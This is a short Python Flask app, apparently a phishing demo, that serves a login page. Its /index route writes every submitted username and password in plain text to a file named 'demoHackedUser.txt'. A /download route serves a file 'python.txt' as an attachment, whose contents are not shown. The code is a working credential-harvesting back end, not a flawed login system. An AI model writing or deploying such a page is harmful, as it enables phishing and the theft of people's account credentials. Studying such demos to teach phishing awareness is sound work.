from flask import Flask, render_template, request, send_file
import os

app = Flask(__name__)


@app.route("/")
@app.route("/login")
def hello_world():
    return render_template('login.html')


@app.route("/index", methods=['GET', 'POST'])
def index_page():
    userFilePath = os.getcwd()+"/demoHackedUser.txt"
    f = open(userFilePath, "w")
    hackedUsername = request.form['username']
    hackedPassword = request.form['password']
    hackedUser = hackedUsername+ " " + hackedPassword
    f.write(hackedUser)
    f.close()
    return render_template('index.html', form=request.form)


@app.route('/download')
def downloadFile():
    return send_file("templates/python.txt", as_attachment=True)